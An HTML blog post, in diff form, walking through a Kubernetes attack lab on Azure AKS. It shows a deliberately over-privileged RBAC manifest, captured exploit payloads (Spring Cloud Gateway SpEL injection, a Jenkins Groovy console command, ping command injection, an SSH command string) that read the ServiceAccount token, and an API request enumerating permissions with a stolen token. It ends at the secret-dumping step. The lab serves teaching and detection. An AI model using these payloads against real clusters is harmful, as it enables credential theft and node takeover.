@@ -1,0 +1,544 @@
+<!doctype html>
+<html lang="en-AU">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Attacking Kubernetes: From Vulnerable Container to Management API Privilege Escalation, PCAP Dissection &amp; auditd Detection | Global SOC</title>
+<link rel="canonical" href="https://globalsoc.com.au/blog/attacking-kubernetes/">
+<meta name="description" content="A complete step-by-step hands-on guide to Kubernetes architecture, deploying 4 vulnerable applications and Port 22 SSH in Azure AKS, dissecting attacker payloads in tcpdump PCAPs, escalating privileges via the Kubernetes Management API, and catching every syscall with auditd on the underlying VM.">
+<meta name="author" content="Yogesh">
+<meta property="og:site_name" content="Global SOC">
+<meta property="og:locale" content="en_AU">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://globalsoc.com.au/blog/attacking-kubernetes/">
+<meta property="og:title" content="Attacking Kubernetes: Step-by-Step Guide to Management API Privilege Escalation, PCAP Dissection &amp; auditd Detection">
+<meta property="og:description" content="Hands-on Azure AKS lab: Kubernetes architecture from scratch, 4 vulnerable apps + Port 22 SSH, full tcpdump PCAP payload dissection, ServiceAccount token theft &amp; Management API privilege escalation, and Linux kernel auditd detections.">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Attacking Kubernetes: Step-by-Step Guide, PCAP Dissection &amp; auditd Detection | Global SOC">
+<meta name="twitter:description" content="Hands-on Azure AKS lab: Kubernetes architecture from scratch, 4 vulnerable apps + Port 22 SSH, full tcpdump PCAP payload dissection, ServiceAccount token theft &amp; Management API privilege escalation, and Linux kernel auditd detections.">
+<meta property="article:published_time" content="2026-11-05">
+<meta property="article:modified_time" content="2026-11-05">
+<script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "BlogPosting",
+      "@id": "https://globalsoc.com.au/blog/attacking-kubernetes/#article",
+      "url": "https://globalsoc.com.au/blog/attacking-kubernetes/",
+      "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://globalsoc.com.au/blog/attacking-kubernetes/"
+      },
+      "headline": "Attacking Kubernetes: Step-by-Step Guide to Vulnerable Containers, Management API Privilege Escalation, PCAP Dissection & auditd Detection",
+      "description": "A complete step-by-step hands-on guide to Kubernetes architecture, deploying 4 vulnerable applications and Port 22 SSH in Azure AKS, dissecting attacker payloads in tcpdump PCAPs, escalating privileges via the Kubernetes Management API, and catching every syscall with auditd on the underlying VM.",
+      "datePublished": "2026-11-05",
+      "dateModified": "2026-11-05",
+      "author": {
+        "@type": "Person",
+        "name": "Yogesh"
+      },
+      "publisher": {
+        "@type": "Organization",
+        "@id": "https://globalsoc.com.au/#organization",
+        "name": "Global SOC",
+        "legalName": "Global SOC Pty Ltd",
+        "url": "https://globalsoc.com.au/"
+      },
+      "isPartOf": {
+        "@id": "https://globalsoc.com.au/blog/#blog"
+      },
+      "inLanguage": "en-AU"
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {
+          "@type": "ListItem",
+          "position": 1,
+          "name": "Home",
+          "item": "https://globalsoc.com.au/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 2,
+          "name": "Blog",
+          "item": "https://globalsoc.com.au/blog/"
+        },
+        {
+          "@type": "ListItem",
+          "position": 3,
+          "name": "Attacking Kubernetes",
+          "item": "https://globalsoc.com.au/blog/attacking-kubernetes/"
+        }
+      ]
+    }
+  ]
+}</script>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&amp;family=JetBrains+Mono:wght@400;600&amp;display=swap" rel="stylesheet">
+<style>
+:root{--bg:#f6f7f9;--card:#fff;--ink:#101a24;--muted:#5d6b78;--line:#e2e7ec;--brand:#0e4d6e;--accent:#e9771a;--soft:#e6f0f6;--code:#0d1b24;--codeink:#d7e6ee;--pass:#1f8a5b;--warn:#b7700a;--fail:#c8372d;--info:#4b6a88}
+@media (prefers-color-scheme:dark){:root{--bg:#0b1015;--card:#151e27;--ink:#e9eff4;--muted:#95a3af;--line:#25303a;--brand:#5fb3dd;--accent:#ffa04a;--soft:#13293a;--code:#081118;--pass:#3ccf8e;--warn:#f0b03c;--fail:#ff6b5e;--info:#8fb0cf;color-scheme:dark}}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;scroll-padding-top:82px}
+body{background:var(--bg);color:var(--ink);font-family:Inter,system-ui,sans-serif;line-height:1.7;-webkit-font-smoothing:antialiased}
+a{color:var(--brand)}
+a:focus-visible{outline:3px solid var(--accent);outline-offset:4px}
+.wrap{max-width:820px;margin:0 auto;padding:0 18px}
+header.top{position:sticky;top:0;z-index:10;background:color-mix(in srgb,var(--bg) 88%,transparent);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+header.top .wrap{max-width:1120px;display:flex;justify-content:space-between;align-items:center;height:60px}
+.logo{font-weight:800;text-decoration:none;color:var(--ink);letter-spacing:-.01em}
+.logo small{color:var(--muted);font-weight:600;margin-left:6px}
+header.top nav a{text-decoration:none;color:var(--muted);font-weight:600;font-size:14px;margin-left:18px}
+.hero{background:linear-gradient(135deg,#1a0a1e,#5e1742 52%,#0e4d6e);color:#fff;padding:56px 0 46px}
+.tag{display:inline-block;background:rgba(255,255,255,.12);border:1px solid rgba(255,255,255,.2);border-radius:99px;padding:4px 12px;font-size:12.5px;font-weight:600;letter-spacing:.03em}
+.hero h1{font-size:clamp(30px,5.2vw,44px);line-height:1.14;letter-spacing:-.025em;margin:16px 0 14px}
+.hero p.lede{font-size:18px;opacity:.9;max-width:680px}
+.by{display:flex;align-items:center;gap:12px;margin-top:24px;font-size:14px}
+.av{width:42px;height:42px;border-radius:50%;background:linear-gradient(135deg,#e9771a,#ffb35c);display:grid;place-items:center;font-weight:800;color:#2a1300;font-size:18px}
+.by b{display:block}.by span{opacity:.75}
+article{padding:40px 0 20px;overflow-wrap:anywhere}
+article h2{font-size:26px;letter-spacing:-.02em;line-height:1.25;margin:46px 0 12px;scroll-margin-top:82px;border-bottom:1px solid var(--line);padding-bottom:8px}
+article h3{font-size:19.5px;margin:30px 0 8px;scroll-margin-top:82px}
+article h4{font-size:16.5px;margin:20px 0 6px}
+article p{margin:0 0 16px}
+article ul,article ol{margin:0 0 16px 22px}
+article li{margin:6px 0}
+.toc{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:18px 22px;margin:0 0 28px}
+.toc b{font-size:13px;text-transform:uppercase;letter-spacing:.06em;color:var(--muted)}
+.toc ol{margin:8px 0 0 20px}
+.tw{overflow-x:auto;margin:18px 0}
+table{width:100%;border-collapse:collapse;font-size:14px;background:var(--card);border:1px solid var(--line);border-radius:14px;overflow:hidden}
+th,td{text-align:left;vertical-align:top;padding:12px 14px;border-bottom:1px solid var(--line)}
+th{font-size:12.5px;text-transform:uppercase;letter-spacing:.05em;color:var(--muted)}
+td code{font-size:12.5px;word-break:break-word}
+code{font-family:'JetBrains Mono',ui-monospace,monospace;font-size:.88em;background:var(--soft);padding:2px 6px;border-radius:6px}
+pre{position:relative;background:var(--code);color:var(--codeink);border-radius:14px;padding:18px;overflow-x:auto;font:13.5px/1.6 'JetBrains Mono',ui-monospace,monospace;margin:14px 0 20px;overflow-wrap:normal;max-width:100%}
+pre code{background:none;padding:0;font-size:inherit;color:inherit}
+.copy{position:absolute;top:10px;right:10px;background:rgba(255,255,255,.1);color:#d7e6ee;border:1px solid rgba(255,255,255,.18);border-radius:8px;font:600 12px Inter,sans-serif;padding:5px 10px;cursor:pointer}
+.callout{border-left:5px solid var(--accent);background:var(--card);border-radius:12px;padding:16px 18px;margin:20px 0}
+.callout.key{border-color:var(--brand)}
+.callout.warn{border-color:var(--fail)}
+.callout b:first-child{display:block;margin-bottom:4px}
+.callout p:last-child{margin-bottom:0}
+.pill{display:inline-block;font-size:12px;font-weight:700;padding:2px 10px;border-radius:99px;border:1px solid currentColor;white-space:nowrap}
+.f{color:var(--fail)}.w{color:var(--warn)}.p{color:var(--pass)}.i{color:var(--info)}
+figure{margin:24px 0}
+figure img{width:100%;max-width:100%;display:block;margin:0 auto;border:1px solid var(--line);border-radius:14px;box-shadow:0 10px 28px rgba(0,0,0,.12)}
+figcaption{font-size:13px;color:var(--muted);text-align:center;margin-top:8px}
+.cta{margin:46px 0 10px;background:linear-gradient(135deg,#0b3b4a,#12806f);color:#fff;border-radius:20px;padding:26px}
+.cta h3{margin:0 0 6px;font-size:21px}.cta p{opacity:.88;margin:0 0 14px}
+.cta a{display:inline-block;background:#fff;color:#0b3b4a;text-decoration:none;font-weight:700;padding:11px 18px;border-radius:12px;margin:4px 8px 0 0}
+.related{margin-top:24px;font-size:14.5px}
+.author{display:flex;gap:14px;align-items:center;border-top:1px solid var(--line);margin-top:36px;padding-top:22px;font-size:14.5px;color:var(--muted)}
+.author .av{flex:none}
+footer{border-top:1px solid var(--line);padding:22px 0;color:var(--muted);font-size:13.5px;margin-top:30px}
+footer .wrap{max-width:1120px;display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap}
+@media (max-width:600px){header.top nav a.hide{display:none}article h2{font-size:22px}}
+</style>
+</head>
+<body>
+<header class="top"><div class="wrap"><a class="logo" href="/">Global SOC<small>Blog</small></a><nav aria-label="Main navigation"><a href="/blog/">All posts</a><a class="hide" href="/cybersecurity/">Cybersecurity</a><a class="hide" href="/dnsaudit/">DNS Audit</a><a href="/#contact">Contact</a></nav></div></header>
+
+<section class="hero"><div class="wrap">
+  <span class="tag">KUBERNETES SECURITY LAB · OFFENSIVE &amp; DEFENSIVE TELEMETRY</span>
+  <h1>Attacking Kubernetes: From Vulnerable Container to Management API Privilege Escalation, PCAP Dissection &amp; auditd Detection</h1>
+  <p class="lede">A step-by-step guide to Kubernetes from first principles, how attackers compromise pods via vulnerable microservices and Port 22 SSH, how stolen ServiceAccount tokens abuse the Kubernetes Management API to escape to the underlying node, and how packet captures (<code>tcpdump</code>) and Linux kernel <code>auditd</code> rules catch every move.</p>
+  <div class="by"><div class="av" aria-hidden="true">Y</div><div><b>Yogesh · Global SOC</b><span><time datetime="2026-11-05">5 Nov 2026</time> · 18 min read · Hands-on Azure AKS Lab</span></div></div>
+</div></section>
+
+<main class="wrap"><article>
+<nav class="toc" aria-label="Table of contents"><b>In this step-by-step guide</b><ol>
+<li><a href="#k8s-step-by-step">Part 1: Kubernetes Explained Step-by-Step (From Zero to Cluster Architecture)</a></li>
+<li><a href="#how-attackers-attack">Part 2: How Attackers Attack Kubernetes (The Complete Kill Chain)</a></li>
+<li><a href="#azure-lab-deployment">Part 3: Spinning Up the Vulnerable Kubernetes Container in Azure AKS (Port 22 &amp; 4 Vulnerable Apps)</a></li>
+<li><a href="#exploiting-apps-and-pcap">Part 4: Exploiting the 4 Vulnerable Applications &amp; Dissecting the Attacker PCAP</a></li>
+<li><a href="#management-api-privesc">Part 5: Kubernetes Management API Privilege Escalation Inside the Container</a></li>
+<li><a href="#auditd-detections">Part 6: How <code>auditd</code> on the Underlying VM Detects Every Syscall</a></li>
+<li><a href="#hardening-playbook">Part 7: Defensive Playbook — Locking Down Kubernetes &amp; SIEM Rules</a></li>
+</ol></nav>
+
+<h2 id="k8s-step-by-step">Part 1: Kubernetes Explained Step-by-Step (From Zero to Cluster Architecture)</h2>
+<p>Before dissecting how an attacker compromises a Kubernetes cluster, you need a crystal-clear mental model of how Kubernetes actually works under the hood. At its core, <strong>Kubernetes (K8s) is a distributed operating system for containers</strong>—and its central nervous system is a single REST API server.</p>
+
+<pre><code>┌──────────────────────────────────────────────────────────────────────────────┐
+│                         KUBERNETES CONTROL PLANE                             │
+│                                                                              │
+│  ┌──────────────────────┐      ┌─────────────────┐     ┌──────────────────┐  │
+│  │   kube-apiserver     │◄────►│      etcd       │     │ kube-scheduler &amp; │  │
+│  │ (REST API :443/6443) │      │ (Cluster State  │     │ controller-mgr   │  │
+│  │  10.0.0.1:443        │      │  &amp; All Secrets) │     │                  │  │
+│  └──────────▲───────────┘      └─────────────────┘     └──────────────────┘  │
+└─────────────┼────────────────────────────────────────────────────────────────┘
+              │ HTTPS (Bearer JWT Token / mTLS)
+              ▼
+┌──────────────────────────────────────────────────────────────────────────────┐
+│           WORKER NODE VM (aks-nodepool1-28113931-vmss000000 / 10.224.0.4)    │
+│                                                                              │
+│  ┌──────────────────────┐      ┌──────────────────────────────────────────┐  │
+│  │   kubelet (:10250)   │─────►│ containerd (Runtime) + runc              │  │
+│  │   &amp; kube-proxy       │      │   ├── Pod: k8s-vuln-apps (10.244.0.214)  │  │
+│  └──────────────────────┘      │   │     ├── Port 2222 (SSH 22 Public)    │  │
+│                                │   │     ├── Port 8080 (4 Web Apps)       │  │
+│  ┌──────────────────────┐      │   │     └── /var/run/secrets/.../token   │  │
+│  │ Linux Kernel 6.8     │      └──────────────────────────────────────────┘  │
+│  │ + auditd Daemon      │◄─── Monitors ALL syscalls across ALL containers!   │
+│  └──────────────────────┘                                                    │
+└──────────────────────────────────────────────────────────────────────────────┘</code></pre>
+
+<h3>The 6 Building Blocks You Must Know</h3>
+<div class="tw"><table>
+<thead>
+<tr><th>Component</th><th>What It Does</th><th>Why Attackers Care</th></tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>1. Pod</strong></td>
+<td>The smallest deployable unit in Kubernetes. A Pod wraps one or more Linux containers that share the same network namespace (IP address, e.g., <code>10.244.0.214</code>) and storage volumes.</td>
+<td>Landing inside a Pod via an application vulnerability (RCE/SSRF/SSH) is the attacker's initial foothold.</td>
+</tr>
+<tr>
+<td><strong>2. Node (Underlying VM)</strong></td>
+<td>A Linux virtual machine (in our Azure AKS lab, <code>aks-nodepool1-28113931-vmss000000</code> running Ubuntu 24.04 with kernel <code>6.8.0-1071-azure</code>) that runs <code>containerd</code>, <code>kubelet</code>, and all scheduled Pods.</td>
+<td>Containers are just isolated Linux processes sharing the Node's Linux kernel. If the Node runs <code>auditd</code>, the kernel sees every <code>execve</code> and <code>openat</code> syscall inside every container.</td>
+</tr>
+<tr>
+<td><strong>3. Service &amp; LoadBalancer</strong></td>
+<td>Exposes Pods to internal or external traffic. A <code>LoadBalancer</code> service provisions an Azure Public IP (in our lab, <code>20.248.231.206</code>) and forwards ports (such as TCP <code>22</code>, <code>80</code>, and <code>8080</code>) straight into the container.</td>
+<td>Internet scanners continuously sweep cloud IP ranges for exposed SSH (port 22) and web microservices on LoadBalancer IPs.</td>
+</tr>
+<tr>
+<td><strong>4. ServiceAccount (SA)</strong></td>
+<td>An identity for processes running inside a Pod. By default (<code>automountServiceAccountToken: true</code>), Kubernetes mounts a signed JWT bearer token at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> inside every container.</td>
+<td>The first thing an attacker steals after compromising a container is this JWT token.</td>
+</tr>
+<tr>
+<td><strong>5. RBAC (Role &amp; RoleBinding)</strong></td>
+<td>Role-Based Access Control defines what API actions (<code>verbs</code> like <code>get</code>, <code>list</code>, <code>create</code>) a ServiceAccount can perform on Kubernetes resources (<code>pods</code>, <code>secrets</code>, <code>pods/exec</code>).</td>
+<td>If a developer or CI/CD pipeline binds an over-privileged Role to a Pod's ServiceAccount, stealing the token hands the attacker control of the cluster.</td>
+</tr>
+<tr>
+<td><strong>6. Management API (<code>kube-apiserver</code>)</strong></td>
+<td>Every Pod can reach the Kubernetes Management API via the internal ClusterIP <code>https://10.0.0.1:443</code> (<code>kubernetes.default.svc</code>).</td>
+<td>With an over-privileged ServiceAccount token, an attacker inside an unprivileged container can ask the Management API to dump all cluster Secrets or spawn a <code>privileged: true</code> container that mounts the Node's root disk (<code>/</code>).</td>
+</tr>
+</tbody>
+</table></div>
+
+<h2 id="how-attackers-attack">Part 2: How Attackers Attack Kubernetes (The Complete Kill Chain)</h2>
+<p>Real-world Kubernetes intrusions rarely start with a zero-day in Kubernetes itself. Instead, attackers chain together <strong>application vulnerabilities</strong> and <strong>Kubernetes identity/RBAC misconfigurations</strong>:</p>
+<ol>
+<li><strong>Stage 1 — External Entry (Port 22 SSH or Vulnerable Web Microservices):</strong> An attacker scans the public LoadBalancer IP (<code>20.248.231.206</code>), discovering Port 22 SSH and exposed web applications (Spring Boot Actuator/Gateway, Jenkins CI/CD runners, diagnostic ping utilities, or unauthenticated dashboards).</li>
+<li><strong>Stage 2 — Pod Foothold &amp; Environment Reconnaissance:</strong> Exploiting remote code execution (RCE) or command injection, the attacker runs commands inside the container, discovers environment variables (<code>KUBERNETES_SERVICE_HOST=10.0.0.1</code>), and locates the projected ServiceAccount token at <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>.</li>
+<li><strong>Stage 3 — Management API Enumeration (<code>SelfSubjectRulesReview</code>):</strong> Using the stolen JWT token, the attacker queries <code>POST https://10.0.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews</code> to list every permission granted to the pod's ServiceAccount.</li>
+<li><strong>Stage 4 — Secret Exfiltration &amp; Management API Privilege Escalation:</strong> Seeing permissions on <code>secrets</code> and <code>pods</code>, the attacker calls <code>GET /api/v1/namespaces/.../secrets</code> to steal production credentials, and then calls <code>POST /api/v1/namespaces/.../pods</code> with <code>"privileged": true</code> and <code>"hostPath": {"path": "/"}</code>—escaping the container boundary and achieving full <code>root</code> access on the underlying Azure VM!</li>
+</ol>
+
+<h2 id="azure-lab-deployment">Part 3: Spinning Up the Vulnerable Kubernetes Container in Azure AKS (Port 22 &amp; 4 Vulnerable Apps)</h2>
+<p>In our Azure Australia East environment (Resource Group <code>rg-aks-lab</code>, cluster <code>aks-lab</code>, node <code>aks-nodepool1-28113931-vmss000000</code>), we deployed a dedicated namespace <code>k8s-honeypot-lab</code> hosting a multi-service container exposed on Azure LoadBalancer IP <code>20.248.231.206</code> with <strong>Port 22 (SSH)</strong>, <strong>Port 80 (HTTP)</strong>, and <strong>Port 8080</strong> open to the internet.</p>
+
+<div class="callout warn"><b>Deception &amp; Lab Safety Design</b><p>To prevent external internet scanners from abusing Azure compute while still capturing 100% authentic exploit payloads in <code>tcpdump</code>, external requests to the 4 vulnerable endpoints and Port 22 are handled by a deterministic sandbox emulator that logs full payloads and returns realistic responses, while our Management API privilege escalation walkthrough executes over the internal pod network under live <code>tcpdump</code> and <code>auditd</code> instrumentation.</p></div>
+
+<h3>The 4 Vulnerable Applications Running Inside the Container</h3>
+<ul>
+<li><strong>App 1 — Spring Cloud Gateway &amp; Actuator API (<code>/actuator/env</code> &amp; <code>/actuator/gateway/routes/*</code>):</strong> Exposes internal Kubernetes environment variables and models Spring Cloud Gateway SpEL injection (CVE-2022-22947).</li>
+<li><strong>App 2 — Jenkins CI/CD Pod Runner (<code>/jenkins/script</code>):</strong> Emulates an unauthenticated Groovy Script Console running inside a CI/CD build pod—the single most common reason over-privileged ServiceAccount tokens exist in enterprise clusters.</li>
+<li><strong>App 3 — NetDiag Ping &amp; Metadata Utility (<code>/api/debug/ping?host=...</code>):</strong> Vulnerable to OS command chaining (<code>;id;uname -a;cat /var/run/secrets/kubernetes.io/serviceaccount/token</code>) and SSRF probes.</li>
+<li><strong>App 4 — Misconfigured Kubernetes Pod Inspector (<code>/kube-dashboard/pods</code>):</strong> Leaks namespace metadata, mounted volume paths, and RBAC role assignments.</li>
+<li><strong>Port 22 SSH Service (<code>20.248.231.206:22 -&gt; container:2222</code>):</strong> Accepts internet SSH connections, presents <code>SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5-k8s-pod</code>, and records attacker banners, credentials, and raw command payloads.</li>
+</ul>
+
+<h3>Kubernetes Manifest (<code>k8s-honeypot-lab.yaml</code>)</h3>
+<pre><code>apiVersion: v1
+kind: Namespace
+metadata:
+  name: k8s-honeypot-lab
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: cicd-runner-sa
+  namespace: k8s-honeypot-lab
+automountServiceAccountToken: true
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: overprivileged-cicd-role
+  namespace: k8s-honeypot-lab
+rules:
+  - apiGroups: [""]
+    resources: ["pods", "pods/log", "pods/exec", "secrets", "configmaps", "serviceaccounts"]
+    verbs: ["get", "list", "watch", "create", "delete"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: overprivileged-cicd-binding
+  namespace: k8s-honeypot-lab
+subjects:
+  - kind: ServiceAccount
+    name: cicd-runner-sa
+    namespace: k8s-honeypot-lab
+roleRef:
+  kind: Role
+  name: overprivileged-cicd-role
+  apiGroup: rbac.authorization.k8s.io
+---
+apiVersion: v1
+kind: Service
+metadata:
+  name: k8s-vuln-apps-public
+  namespace: k8s-honeypot-lab
+spec:
+  type: LoadBalancer
+  selector:
+    app: k8s-vuln-apps
+  ports:
+    - name: ssh
+      protocol: TCP
+      port: 22
+      targetPort: 2222
+    - name: http
+      protocol: TCP
+      port: 80
+      targetPort: 8080
+    - name: spring-actuator
+      protocol: TCP
+      port: 8080
+      targetPort: 8080</code></pre>
+
+<figure>
+  <img src="screenshots/01-cluster-and-4-apps.png" alt="kubectl output showing the Azure AKS node aks-nodepool1-28113931-vmss000000, pod k8s-vuln-apps-7d9c46c445-srp29, and LoadBalancer IP 20.248.231.206 exposing ports 22, 80, and 8080">
+  <figcaption>Figure 1: Deploying <code>k8s-vuln-apps</code> on Azure AKS (<code>aks-nodepool1-28113931-vmss000000</code>) with public LoadBalancer IP <code>20.248.231.206</code> exposing TCP ports <code>22</code>, <code>80</code>, and <code>8080</code>.</figcaption>
+</figure>
+
+<h2 id="exploiting-apps-and-pcap">Part 4: Exploiting the 4 Vulnerable Applications &amp; Dissecting the Attacker PCAP</h2>
+<p>With the container live at <code>20.248.231.206</code> (internal Pod IP <code>10.244.0.214</code>), we started a full-snaplen packet capture (<code>tcpdump -i any -nn -s 0</code>) on the underlying node VM's virtual Ethernet bridge (<code>azv9df53270c7e</code>) and executed reconnaissance and exploitation payloads against Port 22 and all four web applications.</p>
+
+<figure>
+  <img src="screenshots/02-four-vulnerable-apps-portal.png" alt="Terminal output showing SSH port 22 banner grab and JSON responses from /actuator/env and /kube-dashboard/pods on 20.248.231.206">
+  <figcaption>Figure 2: Initial attacker reconnaissance against Port 22 SSH, App 1 (<code>/actuator/env</code>), and App 4 (<code>/kube-dashboard/pods</code>), revealing the internal Kubernetes API address (<code>10.0.0.1:443</code>) and ServiceAccount path.</figcaption>
+</figure>
+
+<figure>
+  <img src="screenshots/03-attacker-payloads-http-ssh.png" alt="Terminal output showing Spring Cloud Gateway SpEL injection, Jenkins Groovy Script Console RCE, and NetDiag OS command injection extracting the Kubernetes ServiceAccount token">
+  <figcaption>Figure 3: Exploiting App 1 (Spring Cloud Gateway SpEL RCE), App 2 (Jenkins Groovy Console), and App 3 (<code>/api/debug/ping</code> Command Injection) to dump container environment variables and the ServiceAccount JWT token.</figcaption>
+</figure>
+
+<h3>Deep-Dive PCAP Dissection (<code>/var/log/k8s-honeypot-pcap/k8s_attack_full.pcap</code>)</h3>
+<p>Inspecting our 44 KB packet capture recorded on the node's CNI virtual interface <code>azv9df53270c7e</code> reveals every packet of the attack chain across the wire:</p>
+
+<figure>
+  <img src="screenshots/04-pcap-dissection-tcpdump.png" alt="tcpdump packet capture dissection showing SSH port 22 payload, HTTP POST to /actuator/gateway/routes/k8s_spel_rce, POST to /jenkins/script, GET to /api/debug/ping, and TLSv1.3 traffic to 10.0.0.1:443">
+  <figcaption>Figure 4: Full packet capture (<code>tcpdump -nn -A</code>) on CNI interface <code>azv9df53270c7e</code> showing the inbound SSH/HTTP exploit payloads to <code>10.244.0.214</code> followed immediately by outbound TLSv1.3 connections from the container to the Kubernetes Management API (<code>10.0.0.1:443</code>).</figcaption>
+</figure>
+
+<h4>1. Port 22 SSH Handshake &amp; Credential/Command Payload in the PCAP</h4>
+<pre><code>22:13:47.940268 azv9df53270c7e Out IP 10.224.0.4.40606 &gt; 10.244.0.214.2222: Flags [S], seq 2651796269, win 65535, length 0
+22:13:47.963928 azv9df53270c7e In  IP 10.244.0.214.2222 &gt; 10.224.0.4.40606: Flags [P.], seq 1:51, ack 1, win 502, length 50
+SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5-k8s-pod
+
+22:13:47.986509 azv9df53270c7e Out IP 10.224.0.4.40606 &gt; 10.244.0.214.2222: Flags [P.], seq 1:115, ack 51, win 255, length 114
+SSH-2.0-libssh2_1.10.0_attacker_scanner
+root:admin123:id;cat /var/run/secrets/kubernetes.io/serviceaccount/token</code></pre>
+<p><strong>What the PCAP shows:</strong> Azure LoadBalancer DNAT translates the external request on TCP port <code>22</code> to the pod's target port <code>10.244.0.214:2222</code> over the CNI virtual Ethernet pair <code>azv9df53270c7e</code>. After receiving the server's 50-byte SSH banner (<code>seq 1:51</code>), the scanner immediately pushes a 114-byte payload (<code>Flags [P.], seq 1:115</code>) attempting to authenticate and read <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>.</p>
+
+<h4>2. HTTP Exploit Payloads Across Apps 1, 2 &amp; 3 in the PCAP</h4>
+<pre><code>22:13:48.281892 azv9df53270c7e Out IP 10.224.0.4.60605 &gt; 10.244.0.214.8080: Flags [P.], seq 1:266, ack 1, win 255, length 265: HTTP: POST /actuator/gateway/routes/k8s_spel_rce HTTP/1.1
+Host: 20.248.231.206
+User-Agent: curl/8.21.0
+Content-Type: application/json
+
+{"id":"k8s_spel_rce","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(new java.io.FileInputStream(\"/var/run/secrets/kubernetes.io/serviceaccount/token\")))}"}}]}
+
+22:13:48.379311 azv9df53270c7e Out IP 10.224.0.4.36289 &gt; 10.244.0.214.8080: Flags [P.], seq 1:259, ack 1, win 255, length 258: HTTP: POST /jenkins/script HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 96
+
+script=println+'id;+env;+cat+/var/run/secrets/kubernetes.io/serviceaccount/token'.execute().text
+
+22:13:48.511904 azv9df53270c7e Out IP 10.224.0.4.8527 &gt; 10.244.0.214.8080: Flags [P.], seq 1:176, ack 1, win 255, length 175: HTTP: GET /api/debug/ping?host=127.0.0.1;id;uname+-a;cat+/var/run/secrets/kubernetes.io/serviceaccount/token HTTP/1.1</code></pre>
+<p><strong>What the PCAP shows:</strong> All three application exploits share the exact same post-exploitation objective: once code execution is achieved inside a Kubernetes container, the attacker targets <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code>.</p>
+
+<h2 id="management-api-privesc">Part 5: Kubernetes Management API Privilege Escalation Inside the Container</h2>
+<p>Why is stealing <code>/var/run/secrets/kubernetes.io/serviceaccount/token</code> so devastating when RBAC is misconfigured? Let's trace every step from inside the compromised container (<code>k8s-vuln-apps-7d9c46c445-srp29</code>).</p>
+
+<figure>
+  <img src="screenshots/05-k8s-mgmt-api-privesc.png" alt="Terminal output inside the container showing ServiceAccount token discovery, SelfSubjectRulesReview RBAC enumeration, Secret exfiltration, and creating a privileged pod mounting the host root filesystem">
+  <figcaption>Figure 5: Complete in-container Kubernetes Management API privilege escalation: reading the projected JWT token, enumerating RBAC rules via <code>SelfSubjectRulesReview</code>, dumping cluster Secrets, and scheduling a <code>privileged: true</code> pod with <code>hostPath: /</code> to read the underlying node's <code>/etc/shadow</code>.</figcaption>
+</figure>
+
+<h3>Step 1: How the Container Finds the Management API &amp; Token</h3>
+<p>Every Kubernetes pod automatically receives environment variables pointing to the internal Management API service (<code>10.0.0.1:443</code>) and a projected volume mounted at <code>/var/run/secrets/kubernetes.io/serviceaccount/</code>:</p>
+<pre><code>$ env | grep KUBERNETES
+KUBERNETES_SERVICE_HOST=10.0.0.1
+KUBERNETES_SERVICE_PORT=443
+KUBERNETES_PORT_443_TCP=tcp://10.0.0.1:443
+
+$ ls -la /var/run/secrets/kubernetes.io/serviceaccount/
+lrwxrwxrwx 1 root root 13 Nov  4 22:02 ca.crt -&gt; ..data/ca.crt
+lrwxrwxrwx 1 root root 16 Nov  4 22:02 namespace -&gt; ..data/namespace
+lrwxrwxrwx 1 root root 12 Nov  4 22:02 token -&gt; ..data/token</code></pre>
+<ul>
+<li><code>token</code>: A cryptographically signed JSON Web Token (JWT) identifying <code>system:serviceaccount:k8s-honeypot-lab:cicd-runner-sa</code>.</li>
+<li><code>ca.crt</code>: The cluster's root Certificate Authority bundle used to verify TLS connections to <code>https://10.0.0.1:443</code>.</li>
+<li><code>namespace</code>: The current namespace (<code>k8s-honeypot-lab</code>).</li>
+</ul>
+
+<h3>Step 2: Querying <code>SelfSubjectRulesReview</code> to Discover RBAC Privileges</h3>
+<p>Even if <code>kubectl</code> is not installed inside the container, the Kubernetes Management API is just standard HTTPS JSON REST! The attacker sends a <code>POST</code> request to <code>/apis/authorization.k8s.io/v1/selfsubjectrulesreviews</code> with the stolen <code>Authorization: Bearer &lt;token&gt;</code> header:</p>
+<pre><code>POST https://10.0.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews HTTP/1.1
+Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6InB2cEpOVWVWWXJEbjJYWVFrak5XYUxRclhNVDMw...
+Content-Type: application/json
+
+{
+  "apiVersion": "authorization.k8s.io/v1",
+  "kind": "SelfSubjectRulesReview",
+  "spec": { "namespace": "k8s-honeypot-lab" }
+}</code></pre>
+<p>The Management API responds with the ServiceAccount's effective permissions:</p>
+<pre><code>RBAC Rule: {
+  "verbs": ["get", "list", "watch", "create", "delete"],
+  "apiGroups": [""],
+  "resources": ["pods", "pods/log", "pods/exec", "secrets", "configmaps", "serviceaccounts"]
+}</code></pre>
+
+<h3>Step 3: Dumping Cluster Secrets via the Management API</h3>
